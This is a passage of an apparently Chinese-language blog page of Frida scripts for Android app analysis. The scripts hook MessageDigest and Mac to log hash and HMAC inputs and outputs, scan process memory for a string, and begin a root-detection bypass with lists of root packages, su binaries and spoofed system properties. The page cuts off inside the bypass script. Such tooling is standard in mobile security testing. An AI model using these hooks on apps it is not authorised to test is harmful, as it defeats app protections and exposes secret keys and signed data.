class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs js"><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * HASH/HMAC</span><br><span class="hljs-comment">     */</span><br>Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>   <span class="hljs-keyword">var</span> hash_complete_bytes = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br>   <span class="hljs-keyword">var</span> hash_index = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">var</span> MessageDigestDef =  Java.use(<span class="hljs-string">&#x27;java.security.MessageDigest&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MacDef =  Java.use(<span class="hljs-string">&#x27;javax.crypto.Mac&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MessageDigestDef_init_1 = MessageDigestDef.$init.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MessageDigestUpdate_1 = MessageDigestDef.update.overload(<span class="hljs-string">&#x27;[B&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MessageDigestUpdate_2 = MessageDigestDef.update.overload(<span class="hljs-string">&#x27;[B&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MessageDigestUpdate_3 = MessageDigestDef.update.overload(<span class="hljs-string">&#x27;java.nio.ByteBuffer&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MessageDigestdigest_1 = MessageDigestDef.digest.overload();<br>   <span class="hljs-keyword">var</span> MessageDigestdigest_2 = MessageDigestDef.digest.overload(<span class="hljs-string">&#x27;[B&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MessageDigestdigest_3 = MessageDigestDef.digest.overload(<span class="hljs-string">&#x27;[B&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MacdoFinal_1          =  MacDef.doFinal.overload();<br>   <span class="hljs-keyword">var</span> MacdoFinal_2          =  MacDef.doFinal.overload(<span class="hljs-string">&#x27;[B&#x27;</span>);<br>   <span class="hljs-keyword">var</span> MacdoFinal_3          =  MacDef.doFinal.overload(<span class="hljs-string">&#x27;[B&#x27;</span>,<span class="hljs-string">&#x27;int&#x27;</span>);<br>   <br>  <br><br><br>    MessageDigestDef_init_1.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">alg</span>) </span>&#123;<br>        <span class="hljs-comment">// console.log(&quot;[*] &quot;+alg);</span><br>        <span class="hljs-keyword">return</span> MessageDigestDef_init_1.call(<span class="hljs-built_in">this</span>,alg);<br>    &#125;<br><br>    MessageDigestUpdate_1.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr</span>) </span>&#123;<br>        hashAddtoarray(arr);<br>       <span class="hljs-comment">// console.log(&quot;MessageDigestUpdate_1 &quot;+b2s(arr))</span><br>        <span class="hljs-keyword">return</span> MessageDigestUpdate_1.call(<span class="hljs-built_in">this</span>, arr);<br>    &#125;<br><br>    MessageDigestUpdate_2.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr,offset,len</span>) </span>&#123;<br>        hashAddtoarray(arr);<br>       <span class="hljs-comment">// console.log(&quot;MessageDigestUpdate_2 &quot;+b2s(arr))</span><br>        <span class="hljs-keyword">return</span> MessageDigestUpdate_2.call(<span class="hljs-built_in">this</span>, arr,offset,len);<br>    &#125;<br><br>    MessageDigestUpdate_3.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr</span>) </span>&#123;<br>        hashAddtoarray(arr);<br>       <span class="hljs-comment">// console.log(&quot;MessageDigestUpdate_3 &quot;+b2s(arr))</span><br>        <span class="hljs-keyword">return</span> MessageDigestUpdate_3.call(<span class="hljs-built_in">this</span>, arr);<br>    &#125;<br><br><br>   MacdoFinal_1.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ret =  MacdoFinal_1.call(<span class="hljs-built_in">this</span>);<br>        hashInfo(<span class="hljs-built_in">this</span>.getAlgorithm(),hash_complete_bytes,ret,<span class="hljs-string">&#x27;MacdoFinal_1&#x27;</span>)<br>        <span class="hljs-keyword">return</span> ret<br>    &#125;<br><br>    MacdoFinal_2.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr</span>) </span>&#123;<br>        hashAddtoarray(arr)<br>        <span class="hljs-keyword">var</span> ret =  MacdoFinal_2.call(<span class="hljs-built_in">this</span>,arr);<br>        hashInfo(<span class="hljs-built_in">this</span>.getAlgorithm(),hash_complete_bytes,ret,<span class="hljs-string">&#x27;MacdoFinal_2&#x27;</span>)<br>        <span class="hljs-keyword">return</span> ret<br>    &#125;<br><br>    MacdoFinal_3.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr,outOffset</span>) </span>&#123;<br>        hashAddtoarray(arr)<br>        <span class="hljs-keyword">var</span> ret =  MacdoFinal_3.call(<span class="hljs-built_in">this</span>,arr,outOffset);<br>        hashInfo(<span class="hljs-built_in">this</span>.getAlgorithm(),hash_complete_bytes,ret,<span class="hljs-string">&#x27;MacdoFinal_3&#x27;</span>)<br>        <span class="hljs-keyword">return</span> ret<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hashInfo</span>(<span class="hljs-params">alg, plain, encoded,method</span>) </span>&#123;<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;\n[*] -----------------------------------------&quot;</span>+alg+<span class="hljs-string">&quot;--------------------------------------------&quot;</span>)<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] method : &quot;</span>+method)<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Hash Algorithm : &quot;</span> + alg);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Hash In  : &quot;</span> + b2s(plain));<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] Hash Out : &quot;</span> + toHexString(encoded));<br>        hash_complete_bytes = [];<br>        hash_index = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">console</span>.log(Java.use(<span class="hljs-string">&quot;android.util.Log&quot;</span>).getStackTraceString(Java.use(<span class="hljs-string">&quot;java.lang.Throwable&quot;</span>).$new()));<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] --------------------------------------------------------------------------------------------&quot;</span>)<br>    &#125;<br><br>    MessageDigestdigest_1.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ret =  MessageDigestdigest_1.call(<span class="hljs-built_in">this</span>);<br>        hashInfo(<span class="hljs-built_in">this</span>.getAlgorithm(),hash_complete_bytes,ret,<span class="hljs-string">&#x27;MessageDigestdigest_1&#x27;</span>)<br>     <span class="hljs-comment">//   console.log(&quot;[*] Algorithm: &quot;+ this.getAlgorithm()+&quot; hash result: &quot;+toHexString(ret))</span><br>        <span class="hljs-keyword">return</span> ret<br>    &#125;<br> <br>    MessageDigestdigest_2.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ret =  MessageDigestdigest_2.call(<span class="hljs-built_in">this</span>,arr);<br>        <span class="hljs-keyword">var</span> hash = b2s(arr);<br>        hashInfo(<span class="hljs-built_in">this</span>.getAlgorithm(),hash_complete_bytes,ret,<span class="hljs-string">&#x27;MessageDigestdigest_2&#x27;</span>)<br>     <span class="hljs-comment">//   console.log(&quot;[*] hash plaintext: &quot;+hash+&quot; hash result: &quot;+toHexString(ret));</span><br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    MessageDigestdigest_3.implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">arr,offset,len</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> ret =  MessageDigestdigest_3.call(<span class="hljs-built_in">this</span>,offset,len);<br>        <span class="hljs-keyword">var</span> hash = b2s(arr);<br>        hashInfo(<span class="hljs-built_in">this</span>.getAlgorithm(),hash_complete_bytes,ret,<span class="hljs-string">&#x27;MessageDigestdigest_3&#x27;</span>)<br>      <span class="hljs-comment">//  console.log(&quot;[*] hash plaintext: &quot;+hash+&quot; hash result: &quot;+toHexString(ret)); </span><br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br><br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hashAddtoarray</span>(<span class="hljs-params">arr</span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>        hash_complete_bytes[hash_index] = arr[i];<br>        hash_index = hash_index + <span class="hljs-number">1</span>;<br>    &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toHexString</span>(<span class="hljs-params">byteArray</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> HEX_DIGITS = <span class="hljs-string">&quot;0123456789abcdef&quot;</span>;<br>    <span class="hljs-keyword">var</span> HEX_DIGIT_BITS = <span class="hljs-number">4</span><br>    <span class="hljs-keyword">var</span> HEX_DIGIT_MASK = <span class="hljs-number">0xF</span><br>    <span class="hljs-keyword">var</span> sb=<span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; byteArray.length; i++) &#123;<br>        <span class="hljs-keyword">var</span> b = byteArray[i] &amp; <span class="hljs-number">0xFF</span>;<br>        sb += HEX_DIGITS.charAt(b &gt;&gt;&gt; HEX_DIGIT_BITS)+HEX_DIGITS.charAt(b &amp; HEX_DIGIT_MASK);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sb;<br>  &#125;<br><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b2s</span>(<span class="hljs-params">array</span>) </span>&#123;<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123;<br>            result += <span class="hljs-built_in">String</span>.fromCharCode(modulus(array[i], <span class="hljs-number">256</span>));<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">modulus</span>(<span class="hljs-params">x, n</span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> ((x % n) + n) % n;<br>    &#125;<br><br>&#125;);<br></code></pre></td></tr></table></figure><h2 id="内存搜索字符串"><a href="#内存搜索字符串" class="headerlink" title="内存搜索字符串"></a>内存搜索字符串</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">scan</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> result = [];<br>    Process.enumerateRanges(<span class="hljs-string">&#x27;r--&#x27;</span>).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">range</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (range.file &amp;&amp; range.file.path) &#123;<br>     <span class="hljs-keyword">try</span> &#123;<br>          <br>       Memory.scanSync(range.base, range.size, <span class="hljs-string">&quot;31 38 38 34 36&quot;</span>).forEach(<span class="hljs-function"><span class="hljs-keyword">function</span> </span><br><span class="hljs-function">                                                                         (<span class="hljs-params">match</span>) </span>&#123;<br>                 <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[*] search : &quot;</span>+range.file.path)<br>                 <span class="hljs-built_in">console</span>.log(hexdump(match.address))<br>           &#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>       &#125;<br>      &#125;<br>    &#125;);<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;No search&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="rootbypass"><a href="#rootbypass" class="headerlink" title="rootbypass"></a>rootbypass</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// Based on  https://codeshare.frida.re/@dzonerzy/fridantiroot/</span><br>Java.perform(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> RootPackages = [<br>        <span class="hljs-string">&quot;com.noshufou.android.su&quot;</span>, <br>        <span class="hljs-string">&quot;com.noshufou.android.su.elite&quot;</span>, <br>        <span class="hljs-string">&quot;eu.chainfire.supersu&quot;</span>,<br>        <span class="hljs-string">&quot;com.koushikdutta.superuser&quot;</span>, <br>        <span class="hljs-string">&quot;com.thirdparty.superuser&quot;</span>, <br>        <span class="hljs-string">&quot;com.yellowes.su&quot;</span>, <br>        <span class="hljs-string">&quot;com.koushikdutta.rommanager&quot;</span>,<br>        <span class="hljs-string">&quot;com.koushikdutta.rommanager.license&quot;</span>, <br>        <span class="hljs-string">&quot;com.dimonvideo.luckypatcher&quot;</span>, <br>        <span class="hljs-string">&quot;com.chelpus.lackypatch&quot;</span>,<br>        <span class="hljs-string">&quot;com.ramdroid.appquarantine&quot;</span>,<br>        <span class="hljs-string">&quot;com.ramdroid.appquarantinepro&quot;</span>,<br>        <span class="hljs-string">&quot;com.devadvance.rootcloak&quot;</span>, <br>        <span class="hljs-string">&quot;com.devadvance.rootcloakplus&quot;</span>,<br>        <span class="hljs-string">&quot;de.robv.android.xposed.installer&quot;</span>,<br>        <span class="hljs-string">&quot;com.saurik.substrate&quot;</span>, <br>        <span class="hljs-string">&quot;com.zachspong.temprootremovejb&quot;</span>, <br>        <span class="hljs-string">&quot;com.amphoras.hidemyroot&quot;</span>,<br>        <span class="hljs-string">&quot;com.amphoras.hidemyrootadfree&quot;</span>,<br>        <span class="hljs-string">&quot;com.formyhm.hiderootPremium&quot;</span>,<br>        <span class="hljs-string">&quot;com.formyhm.hideroot&quot;</span>,<br>        <span class="hljs-string">&quot;me.phh.superuser&quot;</span>,<br>        <span class="hljs-string">&quot;eu.chainfire.supersu.pro&quot;</span>, <br>        <span class="hljs-string">&quot;com.kingouser.com&quot;</span><br>    ];<br>    <span class="hljs-keyword">var</span> RootBinaries = [<span class="hljs-string">&quot;mu&quot;</span>, <span class="hljs-string">&quot;.su&quot;</span>, <span class="hljs-string">&quot;su&quot;</span>, <span class="hljs-string">&quot;busybox&quot;</span>, <span class="hljs-string">&quot;supersu&quot;</span>, <span class="hljs-string">&quot;Superuser.apk&quot;</span>, <span class="hljs-string">&quot;KingoUser.apk&quot;</span>, <span class="hljs-string">&quot;SuperSu.apk&quot;</span>,<span class="hljs-string">&quot;mounts&quot;</span>]; <span class="hljs-comment">//,&quot;status&quot;&quot;cmdline&quot;</span><br>    <span class="hljs-keyword">var</span> RootProperties = &#123;<br>        <span class="hljs-string">&quot;ro.build.selinux&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;ro.debuggable&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>        <span class="hljs-string">&quot;service.adb.root&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>        <span class="hljs-string">&quot;ro.secure&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>    &#125;;<br>    <span class="hljs-keyword">var</span> RootPropertiesKeys = [];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> RootProperties) RootPropertiesKeys.push(k);<br><br> <br><br>      <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * 通过判断是否存在Superuser.apk或su等命令来判断环境</span><br><span class="hljs-comment">         * HOOK File.exists()</span><br><span class="hljs-comment">         * File.getName() 获取输入的文件路径</span><br><span class="hljs-comment">         * 与RootBinaries特征进行匹配</span><br><span class="hljs-comment">      */</span><br>    <br>    <span 